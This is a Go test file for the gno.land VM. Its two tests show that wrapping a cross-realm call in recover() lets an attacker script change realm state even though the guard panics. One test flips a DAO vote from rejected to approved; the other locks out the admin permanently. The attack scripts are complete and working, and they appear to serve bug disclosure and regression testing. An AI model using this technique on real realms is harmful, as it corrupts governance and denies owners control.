package vm

import (
	"fmt"
	"testing"

	"github.com/gnolang/gno/gno.land/pkg/gnoland/ugnot"
	gnolang "github.com/gnolang/gno/gnovm/pkg/gnolang"
	"github.com/gnolang/gno/tm2/pkg/crypto"
	"github.com/gnolang/gno/tm2/pkg/std"
	"github.com/stretchr/testify/require"
)

// TestCrossRealmAssignRecover_GovernanceCorruption demonstrates that
// assign+recover state corruption is dangerous even WITHOUT OriginCaller.
//
// Scenario: A DAO governance realm tracks proposal votes. An attacker
// uses the assign+recover trick to flip a vote result from "rejected"
// to "approved" — no fund theft needed, pure state corruption.
func TestCrossRealmAssignRecover_GovernanceCorruption(t *testing.T) {
	env := setupTestEnv()
	ctx := env.vmk.MakeGnoTransactionStore(env.ctx)

	deployer := crypto.AddressFromPreimage([]byte("deployer"))
	attacker := crypto.AddressFromPreimage([]byte("attacker"))

	deployerAcc := env.acck.NewAccountWithAddress(ctx, deployer)
	env.acck.SetAccount(ctx, deployerAcc)
	env.bankk.SetCoins(ctx, deployer, std.MustParseCoins(ugnot.ValueString(10_000_000)))

	attackerAcc := env.acck.NewAccountWithAddress(ctx, attacker)
	env.acck.SetAccount(ctx, attackerAcc)
	env.bankk.SetCoins(ctx, attacker, std.MustParseCoins(ugnot.ValueString(10_000_000)))

	// Deploy a simple governance realm.
	// - No OriginCaller anywhere.
	// - Vote tally is a package-level var.
	// - SetVotes is a non-crossing function (no `cur realm`).
	const govPath = "gno.land/r/test/governance"
	govFiles := []*std.MemFile{
		{Name: "gnomod.toml", Body: gnolang.GenGnoModLatest(govPath)},
		{Name: "gov.gno", Body: `package governance

var (
	yesVotes int
	noVotes  int
	finalized bool
)

func init() {
	// Proposal #1 was voted on: 10 yes, 90 no → rejected.
	yesVotes = 10
	noVotes = 90
	finalized = true
}

// SetVotes allows overriding the tally (e.g. for migration).
// Non-crossing — should panic if called cross-realm.
func SetVotes(yes, no int) {
	yesVotes = yes
	noVotes = no
}

func GetResult(cur realm) string {
	if !finalized {
		return "pending"
	}
	if yesVotes > noVotes {
		return "approved"
	}
	return "rejected"
}

func GetTally(cur realm) (int, int) {
	return yesVotes, noVotes
}
`},
	}
	require.NoError(t, env.vmk.AddPackage(ctx, NewMsgAddPackage(deployer, govPath, govFiles)))

	// Verify initial state: proposal is rejected (10 yes, 90 no).
	res, err := env.vmk.Call(ctx, NewMsgCall(deployer, std.Coins{}, govPath, "GetResult", nil))
	require.NoError(t, err)
	require.Contains(t, res, "rejected", "proposal must start as rejected")

	// Attacker flips the vote via assign+recover.
	runFiles := []*std.MemFile{
		{Name: "main.gno", Body: `package main

import "gno.land/r/test/governance"

func main() {
	result := governance.GetResult(cross)
	println("before:", result)

	// Corrupt the tally: flip to 99 yes, 1 no.
	func() {
		defer func() {
			r := recover()
			if r != nil {
				println("panic caught:", r.(string))
			}
		}()
		governance.SetVotes(99, 1)
	}()

	result = governance.GetResult(cross)
	println("after:", result)
}
`},
	}
	res, err = env.vmk.Run(ctx, NewMsgRun(attacker, std.Coins{}, runFiles))
	require.NoError(t, err)

	// The cross-realm guard fired but was recovered.
	require.Contains(t, res, "panic caught:")
	require.Contains(t, res, "external-realm")

	// State corruption: vote flipped from rejected to approved.
	require.Contains(t, res, "before: rejected")
	require.Contains(t, res, "after: approved",
		"vote result must be corrupted to 'approved' despite cross-realm guard")

	// Corruption persists after commit.
	env.vmk.CommitGnoTransactionStore(ctx)
	ctx2 := env.vmk.MakeGnoTransactionStore(env.ctx)
	res, err = env.vmk.Call(ctx2, NewMsgCall(deployer, std.Coins{}, govPath, "GetResult", nil))
	require.NoError(t, err)
	require.Contains(t, res, "approved",
		"corrupted vote must persist after commit — permanent governance damage")
}

// TestCrossRealmAssignRecover_PermanentAdminLockout demonstrates
// a DoS attack: corrupt admin to an address nobody controls,
// permanently locking out the real admin. Uses CurrentRealm, not OriginCaller.
func TestCrossRealmAssignRecover_PermanentAdminLockout(t *testing.T) {
	env := setupTestEnv()
	ctx := env.vmk.MakeGnoTransactionStore(env.ctx)

	deployer := crypto.AddressFromPreimage([]byte("deployer"))
	attacker := crypto.AddressFromPreimage([]byte("attacker"))

	deployerAcc := env.acck.NewAccountWithAddress(ctx, deployer)
	env.acck.SetAccount(ctx, deployerAcc)
	env.bankk.SetCoins(ctx, deployer, std.MustParseCoins(ugnot.ValueString(10_000_000)))

	attackerAcc := env.acck.NewAccountWithAddress(ctx, attacker)
	env.acck.SetAccount(ctx, attackerAcc)
	env.bankk.SetCoins(ctx, attacker, std.MustParseCoins(ugnot.ValueString(10_000_000)))

	// Deploy a realm that uses PreviousRealm (not OriginCaller) for auth.
	const svcPath = "gno.land/r/test/service"
	svcFiles := []*std.MemFile{
		{Name: "gnomod.toml", Body: gnolang.GenGnoModLatest(svcPath)},
		{Name: "svc.gno", Body: fmt.Sprintf(`package service

import "chain/runtime"

var admin address

func init() {
	admin = address("%s")
}

// SetAdmin: non-crossing, should panic on cross-realm call.
func SetAdmin(newAdmin address) {
	admin = newAdmin
}

func GetAdmin(cur realm) address {
	return admin
}

// DoSomething: only admin can call. Uses PreviousRealm, NOT OriginCaller.
func DoSomething(cur realm) string {
	caller := runtime.PreviousRealm().Address()
	if caller != admin {
		panic("unauthorized: " + string(caller) + " != " + string(admin))
	}
	return "success"
}
`, deployer.String())},
	}
	require.NoError(t, env.vmk.AddPackage(ctx, NewMsgAddPackage(deployer, svcPath, svcFiles)))

	// Deployer can use the service.
	res, err := env.vmk.Call(ctx, NewMsgCall(deployer, std.Coins{}, svcPath, "DoSomething", nil))
	require.NoError(t, err)
	require.Contains(t, res, "success")

	// Attacker corrupts admin to a dead address (nobody's key).
	deadAddr := crypto.AddressFromPreimage([]byte("dead-address-nobody-controls"))
	runFiles := []*std.MemFile{
		{Name: "main.gno", Body: fmt.Sprintf(`package main

import "gno.land/r/test/service"

func main() {
	adminBefore := service.GetAdmin(cross)
	println("admin before:", adminBefore)

	// Corrupt admin to a dead address.
	func() {
		defer func() { _ = recover() }()
		service.SetAdmin(address("%s"))
	}()

	adminAfter := service.GetAdmin(cross)
	println("admin after:", adminAfter)
}
`, deadAddr.String())},
	}
	res, err = env.vmk.Run(ctx, NewMsgRun(attacker, std.Coins{}, runFiles))
	require.NoError(t, err)
	require.Contains(t, res, "admin before: "+deployer.String())
	require.Contains(t, res, "admin after: "+deadAddr.String(),
		"admin must be corrupted to the dead address")

	// Now even the original deployer is locked out permanently.
	env.vmk.CommitGnoTransactionStore(ctx)
	ctx2 := env.vmk.MakeGnoTransactionStore(env.ctx)

	_, err = env.vmk.Call(ctx2, NewMsgCall(deployer, std.Coins{}, svcPath, "DoSomething", nil))
	require.Error(t, err, "deployer must be locked out after admin corruption")
	require.Contains(t, err.Error(), "unauthorized",
		"real admin is permanently locked out — DoS via state corruption")
}
